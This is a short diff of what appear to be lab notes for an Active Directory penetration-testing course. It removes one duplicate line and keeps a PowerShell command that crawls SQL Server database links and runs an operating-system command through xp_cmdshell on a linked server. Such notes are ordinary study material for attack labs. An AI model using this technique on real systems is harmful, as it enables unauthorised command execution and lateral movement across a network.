@@ -76,8 +76,6 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 
 Run commands using crawler
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" 
-
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
 ```
 
